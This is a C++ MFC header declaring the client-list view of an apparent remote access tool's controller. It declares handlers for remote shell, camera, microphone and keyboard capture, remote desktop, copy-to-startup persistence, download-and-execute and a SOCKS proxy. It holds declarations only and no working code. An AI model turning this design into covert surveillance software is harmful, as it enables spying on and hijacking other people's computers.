#pragma once
#include "afxwin.h"
#include "KernelSrv.h"

class CClientGroup;

class CClientView :
	public CView
{
private:
	CMFCTabCtrl m_tabGroups;

	CMapStringToPtr m_ClientGroups;
	CClientGroup*   m_DefaultGroup;

	int m_ClientCount;
public:

	DECLARE_DYNCREATE(CClientView)
	CClientGroup * FindGroupByKernel(CKernelSrv * kernel);
	CClientGroup * FindGroupByName(CONST TCHAR* name);

	CClientGroup* CreateGroup(CONST TCHAR * GroupName);

	//Control:
	afx_msg void OnSessionDisconnect();
	afx_msg void OnSessionUninstall();
	afx_msg void OnPowerShutdown();
	afx_msg void OnPowerReboot();
	afx_msg void OnOperationEditcomment();
	afx_msg void OnOperationCmd();
	afx_msg void OnOperationChatbox();
	afx_msg void OnOperationFilemanager();
	afx_msg void OnOperationCamera();
	afx_msg void OnSessionRestart();
	afx_msg void OnOperationMicrophone();
	afx_msg void OnOperationKeyboard();
	afx_msg void OnUtilsAddto();
	afx_msg void OnUtilsCopytostartup();
	afx_msg void OnUtilsDownloadandexec();
	afx_msg void OnProxySocksproxy();
	afx_msg void OnSessionExit();
	afx_msg void OnUtilsOpenwebpage();
	afx_msg void OnOperationProcessmanager();
	afx_msg void OnRemotedesktopDxgi();
	afx_msg void OnRemotedesktopGdi();
	
	//kernel notify message
	afx_msg LRESULT OnClientLogin(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnClientLogout(WPARAM wParam, LPARAM lParam);

	afx_msg LRESULT OnEditComment(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnEditGroup(WPARAM wParam, LPARAM lParam);
	
	afx_msg LRESULT OnKernelError(WPARAM error, LPARAM lParam);
	afx_msg LRESULT OnUpdateUploadStatu(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnGetModulePath(WPARAM wParam, LPARAM lParam);


	CClientView();
	virtual ~CClientView();
	virtual void OnDraw(CDC* /*pDC*/);
	DECLARE_MESSAGE_MAP()
	afx_msg int OnCreate(LPCREATESTRUCT lpCreateStruct);
	afx_msg void OnSize(UINT nType, int cx, int cy);
	virtual BOOL PreCreateWindow(CREATESTRUCT& cs);
	afx_msg void OnContextMenu(CWnd* /*pWnd*/, CPoint /*point*/);
	afx_msg void OnMainRemovecurrentgroup();
	afx_msg void OnMainAddgroup();
	afx_msg void OnOperationModifygroup();
	afx_msg void OnDestroy();
};

